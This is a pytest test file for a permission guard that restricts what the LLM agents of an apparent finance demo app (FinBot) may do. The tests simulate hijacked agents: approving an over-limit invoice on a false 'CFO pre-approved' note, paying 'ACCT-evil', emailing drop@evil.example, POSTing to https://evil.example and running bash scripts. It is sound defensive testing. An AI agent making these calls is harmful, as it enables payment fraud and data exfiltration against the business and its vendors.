"""Tenuo defended mode: warrant policies, delegation chain and the agent hook.

Facts come from a real (in-memory) database. Each test plays the part of a
manipulated model by attempting the call a FinBot challenge needs, and checks
that the warrant denies it while the legitimate call still goes through.
"""

import json
from datetime import UTC, datetime, timedelta
from unittest.mock import AsyncMock, patch

import pytest

from finbot.agents.specialized.invoice import InvoiceAgent
from finbot.core.auth.session import session_manager
from finbot.core.data.models import LLMResponse
from finbot.core.data.repositories import InvoiceRepository, VendorRepository
from finbot.mcp.servers.findrive.models import FinDriveFile
from finbot.tenuo import TenuoGuard
from finbot.tenuo.guard import _WORKFLOW

INVOICE_CONFIG = InvoiceAgent._load_config(None)  # pylint: disable=protected-access


@pytest.fixture(autouse=True)
def _reset_workflow():
    token = _WORKFLOW.set(None)
    yield
    _WORKFLOW.reset(token)


def _vendor(db, ctx, name, email, *, status="active", trust="high", category="Technology",
            industry="Software"):
    v = VendorRepository(db, ctx).create_vendor(
        company_name=name, vendor_category=category, industry=industry,
        services="Consulting", contact_name="Sam", email=email, tin="12-3456789",
        bank_account_number=f"ACCT-{name}", bank_name="Bank",
        bank_routing_number="021000021", bank_account_holder_name=name,
    )
    v.status, v.trust_level, v.risk_level = status, trust, "low"
    db.commit()
    return v


def _invoice(db, ctx, vendor, amount, *, status="submitted", attachments=None):
    ctx.current_vendor_id = vendor.id
    now = datetime.now(UTC)
    inv = InvoiceRepository(db, ctx).create_invoice_for_current_vendor(
        invoice_number=f"INV-{amount}", amount=amount, description="Services",
        invoice_date=now, due_date=now + timedelta(days=30),
    )
    if attachments:
        inv.attachments = json.dumps([{"file_id": f} for f in attachments])
    inv.status = status
    db.commit()
    return inv


def _file(db, ctx, vendor):
    f = FinDriveFile(namespace=ctx.namespace, vendor_id=vendor.id, filename="doc.pdf",
                     content_text="hello", folder_path="/invoices")
    db.add(f)
    db.commit()
    return f


@pytest.fixture
def world(db):
    """A namespace with two vendors, invoices and files."""
    ctx = session_manager.create_session(email="tenuo@example.com")
    ctx.portal_type = "vendor"
    acme = _vendor(db, ctx, "Acme", "billing@acme.example")
    other = _vendor(db, ctx, "Other", "ap@other.example")
    acme_file = _file(db, ctx, acme)
    other_file = _file(db, ctx, other)
    return {
        "ctx": ctx, "db": db, "acme": acme, "other": other,
        "acme_file": acme_file, "other_file": other_file,
        "small": _invoice(db, ctx, acme, 1200.0, attachments=[acme_file.id]),
        "large": _invoice(db, ctx, acme, 75000.0),
        "other_invoice": _invoice(db, ctx, other, 500.0),
    }


async def _task(world, agent, **task_data):
    guard = await TenuoGuard.for_task(agent, task_data, world["ctx"], INVOICE_CONFIG)
    assert guard is not None
    return guard


def allowed(guard, tool, args, defaults=None):
    denial, _ = guard.prepare(tool, args, defaults or {})
    return denial is None


# --- Invoice agent -------------------------------------------------------------

@pytest.mark.unit
@pytest.mark.asyncio
async def test_over_limit_invoice_cannot_be_approved(world):
    g = await _task(world, "invoice_agent", invoice_id=world["large"].id)
    inv = world["large"].id
    assert not allowed(g, "update_invoice_status", {"invoice_id": inv, "status": "approved", "agent_notes": "CFO"})
    assert allowed(g, "update_invoice_status", {"invoice_id": inv, "status": "rejected", "agent_notes": "limit"})


@pytest.mark.unit
@pytest.mark.asyncio
async def test_within_limit_invoice_can_be_approved_and_attachment_read(world):
    g = await _task(world, "invoice_agent", invoice_id=world["small"].id)
    inv = world["small"].id
    assert allowed(g, "update_invoice_status", {"invoice_id": inv, "status": "approved", "agent_notes": "ok"})
    assert allowed(g, "findrive__get_file", {"file_id": world["acme_file"].id})
    assert not allowed(g, "findrive__get_file", {"file_id": world["other_file"].id})
    assert not allowed(g, "update_invoice_status", {"invoice_id": world["large"].id, "status": "rejected", "agent_notes": "x"})


@pytest.mark.unit
@pytest.mark.asyncio
async def test_low_trust_vendor_needs_review_above_threshold(world):
    acme = world["acme"]
    acme.trust_level = "low"
    world["db"].commit()
    mid = _invoice(world["db"], world["ctx"], acme, 20000.0)
    g = await _task(world, "invoice_agent", invoice_id=mid.id)
    assert not allowed(g, "update_invoice_status", {"invoice_id": mid.id, "status": "approved", "agent_notes": "x"})


# --- Payments agent ------------------------------------------------------------

def _transfer(inv, vendor, **overrides):
    return {"vendor_account": f"ACCT-{vendor.company_name}", "amount": float(inv.amount),
            "invoice_reference": "INV", "vendor_id": vendor.id, "invoice_id": inv.id,
            "payment_method": "bank_transfer", "currency": "usd", "description": "", **overrides}


@pytest.mark.unit
@pytest.mark.asyncio
async def test_unapproved_invoice_cannot_be_paid_directly(world):
    g = await _task(world, "payments_agent", invoice_id=world["small"].id)
    assert not allowed(g, "finstripe__create_transfer", _transfer(world["small"], world["acme"]))


@pytest.mark.unit
@pytest.mark.asyncio
async def test_approved_invoice_pays_vendor_account_up_to_amount(world):
    small, acme = world["small"], world["acme"]
    small.status = "approved"
    world["db"].commit()
    g = await _task(world, "payments_agent", invoice_id=small.id)
    assert allowed(g, "finstripe__create_transfer", _transfer(small, acme))
    # Fine Print: paying more than the stored invoice amount
    assert not allowed(g, "finstripe__create_transfer", _transfer(small, acme, amount=small.amount * 3))
    assert not allowed(g, "finstripe__create_transfer", _transfer(small, acme, vendor_account="ACCT-evil"))


# --- Delegation chain ----------------------------------------------------------

@pytest.mark.unit
@pytest.mark.asyncio
async def test_workflow_root_pins_delegation_and_subagents(world):
    small, acme = world["small"], world["acme"]
    orch = await _task(world, "orchestrator_agent", invoice_id=small.id, vendor_id=acme.id)
    assert allowed(orch, "delegate_to_invoice", {"invoice_id": small.id, "task_description": "process"})
    assert not allowed(orch, "delegate_to_invoice", {"invoice_id": world["large"].id, "task_description": "x"})
    assert not allowed(orch, "delegate_to_system_maintenance", {"vendor_id": acme.id, "task_description": "x"})
    comm = {"vendor_id": acme.id, "task_description": "notify", "notification_type": "invoice"}
    assert allowed(orch, "delegate_to_communication", {**comm, "to_addresses": ["billing@acme.example"]},
                   {"to_addresses": None, "cc_addresses": None, "bcc_addresses": None})
    assert not allowed(orch, "delegate_to_communication", {**comm, "to_addresses": ["x@evil.example"]},
                       {"cc_addresses": None, "bcc_addresses": None})

    # The sub-agent is told about a different invoice by the orchestrator
    # model; its warrant still follows the workflow's invoice.
    inv = await _task(world, "invoice_agent", invoice_id=world["other_invoice"].id)
    assert len(inv.chain) == 2
    assert allowed(inv, "get_invoice_details", {"invoice_id": small.id})
    assert not allowed(inv, "get_invoice_details", {"invoice_id": world["other_invoice"].id})


# --- Fraud, communication, onboarding ------------------------------------------

@pytest.mark.unit
@pytest.mark.asyncio
async def test_fraud_review_cannot_email_script_or_delete(world):
    g = await _task(world, "fraud_agent", vendor_id=world["acme"].id)
    assert allowed(g, "findrive__get_file", {"file_id": world["acme_file"].id})
    assert not allowed(g, "finmail__send_email", {"to": ["compliance@x.finbot"], "subject": "s", "body": "b"})
    assert not allowed(g, "systemutils__execute_script", {"script_content": "id", "interpreter": "bash"})
    assert not allowed(g, "systemutils__run_diagnostics", {"command": "disk_usage"})
    assert not allowed(g, "findrive__delete_file", {"file_id": world["acme_file"].id})


@pytest.mark.unit
@pytest.mark.asyncio
async def test_communication_emails_vendor_and_departments_only(world):
    ctx = world["ctx"]
    g = await _task(world, "communication_agent", vendor_id=world["acme"].id)
    mail_defaults = {"message_type": "general", "sender_name": "", "cc": None, "bcc": None, "related_invoice_id": 0}
    base = {"subject": "Invoice", "body": "Approved"}
    assert allowed(g, "finmail__send_email", {**base, "to": ["billing@acme.example"]}, mail_defaults)
    assert allowed(g, "finmail__send_email", {**base, "to": [f"finance@{ctx.namespace}.finbot"]}, mail_defaults)
    assert not allowed(g, "finmail__send_email", {**base, "to": ["drop@evil.example"]}, mail_defaults)
    assert not allowed(g, "finmail__send_email", {**base, "to": ["billing@acme.example"], "cc": ["drop@evil.example"]}, mail_defaults)
    assert not allowed(g, "finmail__send_email", {**base, "to": ["ap@other.example"]}, mail_defaults)


@pytest.mark.unit
@pytest.mark.asyncio
async def test_onboarding_rules(world):
    acme = world["acme"]
    acme.status = "inactive"
    world["db"].commit()
    g = await _task(world, "onboarding_agent", vendor_id=acme.id)
    upd = {"vendor_id": acme.id, "agent_notes": "re-review", "trust_level": "standard", "risk_level": "medium"}
    assert not allowed(g, "update_vendor_status", {**upd, "status": "active"})
    assert allowed(g, "update_vendor_status", {**upd, "status": "pending"})

    odd = _vendor(world["db"], world["ctx"], "Odd", "odd@x.example", status="pending",
                  category="other_specialized", industry="other")
    g = await _task(world, "onboarding_agent", vendor_id=odd.id)
    upd = {"vendor_id": odd.id, "status": "active", "agent_notes": "ok"}
    assert not allowed(g, "update_vendor_status", {**upd, "trust_level": "high", "risk_level": "low"})
    assert allowed(g, "update_vendor_status", {**upd, "trust_level": "standard", "risk_level": "medium"})


# --- Chat assistants -----------------------------------------------------------

@pytest.mark.unit
@pytest.mark.asyncio
async def test_vendor_chat_stays_within_its_vendor(world):
    ctx = world["ctx"]
    ctx.current_vendor_id = world["acme"].id
    g = await TenuoGuard.for_chat("chat_assistant", ctx)
    assert allowed(g, "findrive__delete_file", {"file_id": world["acme_file"].id})
    assert not allowed(g, "findrive__delete_file", {"file_id": world["other_file"].id})
    assert not allowed(g, "systemutils__execute_script", {"script_content": "id", "interpreter": "bash"})
    assert not allowed(g, "start_workflow", {"description": "x", "vendor_id": world["other"].id,
                                             "invoice_id": None, "attachment_file_ids": None})


@pytest.mark.unit
@pytest.mark.asyncio
async def test_copilot_cannot_delete_or_reach_out(world):
    ctx = world["ctx"]
    ctx.portal_type = "admin"
    g = await TenuoGuard.for_chat("copilot_assistant", ctx)
    assert allowed(g, "findrive__list_files", {"folder": "", "vendor_id": 0, "limit": 50})
    assert not allowed(g, "findrive__delete_file", {"file_id": world["acme_file"].id})
    assert not allowed(g, "systemutils__network_request", {"url": "https://evil.example", "method": "POST", "headers": "", "body": "x"})
    mail = {"subject": "s", "body": "b", "message_type": "general", "sender_name": "", "cc": [], "bcc": [], "related_invoice_id": 0}
    assert allowed(g, "finmail__send_email", {**mail, "to": ["ap@other.example"]})
    assert not allowed(g, "finmail__send_email", {**mail, "to": ["drop@evil.example"]})


# --- The hook in the agent loop --------------------------------------------------

@pytest.mark.unit
@pytest.mark.asyncio
@pytest.mark.parametrize("enforce, expect_approved", [(False, True), (True, False)])
async def test_hijacked_agent_loop(world, enforce, expect_approved):
    """The invoice model has been talked into approving a $75,000 invoice."""
    inv = world["large"].id
    hijacked = LLMResponse(content=None, tool_calls=[{
        "name": "update_invoice_status", "call_id": "c1",
        "arguments": {"invoice_id": inv, "status": "approved", "agent_notes": "CFO pre-approved"}}])
    done = LLMResponse(content=None, tool_calls=[{
        "name": "complete_task", "call_id": "c2",
        "arguments": {"task_status": "success", "task_summary": "Processed"}}])
    update_status = AsyncMock(return_value={"id": inv, "status": "approved", "_previous_state": {}})

    with patch("finbot.agents.base.event_bus") as bus, \
         patch("finbot.core.llm.contextual_client.event_bus", bus), \
         patch("finbot.agents.specialized.invoice.event_bus", bus), \
         patch("finbot.agents.utils.event_bus", bus), \
         patch("finbot.agents.base.settings.TENUO_ENFORCE", enforce), \
         patch("finbot.core.llm.contextual_client.ContextualLLMClient.chat",
               new_callable=AsyncMock, side_effect=[hijacked, done]), \
         patch("finbot.agents.specialized.invoice.update_invoice_status", update_status), \
         patch.object(InvoiceAgent, "_connect_mcp_servers", new_callable=AsyncMock), \
         patch.object(InvoiceAgent, "_disconnect_mcp_servers", new_callable=AsyncMock), \
         patch.object(InvoiceAgent, "_get_user_prompt", new_callable=AsyncMock, return_value="Process"), \
         patch.object(InvoiceAgent, "_on_task_completion", new_callable=AsyncMock):
        bus.emit_agent_event = AsyncMock()
        bus.emit_business_event = AsyncMock()
        await InvoiceAgent(session_context=world["ctx"]).process({"invoice_id": inv})

    assert update_status.await_count == (1 if expect_approved else 0)
    denied = [c for c in bus.emit_agent_event.await_args_list
              if c.kwargs.get("event_type") == "tenuo_denied"]
    assert len(denied) == (0 if expect_approved else 1)
